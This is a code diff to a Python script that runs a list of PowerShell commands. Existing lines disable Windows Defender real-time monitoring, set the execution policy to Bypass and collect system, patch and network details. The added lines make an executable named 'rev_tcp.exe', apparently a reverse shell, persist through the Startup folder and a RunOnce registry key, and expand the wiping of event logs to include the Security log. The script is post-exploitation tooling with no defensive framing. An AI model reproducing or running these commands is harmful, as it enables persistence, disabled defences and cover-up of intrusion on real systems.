@@ -17,6 +17,8 @@ def run_powershell_command(command):
 def main():
     cmnds_to_run = [
         '''Set-MpPreference -DisableRealtimeMonitoring $true''',
+        '''Copy-Item "C:\temp\rev_tcp.exe" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"''',
+        '''Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce' -Name 'MyProgram' -Value 'C:\temp\rev_tcp.exe'''',
         '''systeminfo''',
         '''systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information''',
         '''wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches''',
@@ -29,7 +31,7 @@ def main():
         '''Get-NetIPAddress''',
         '''Get-WmiObject -Class Win32_Product''',
         '''Set-ExecutionPolicy Bypass''',
-        '''Clear-EventLog''',
+        '''Clear-EventLog -LogName "Application", "System","Security","Setup","ForwardedEvents" ''',
         '''exit'''
     ]
     output =""
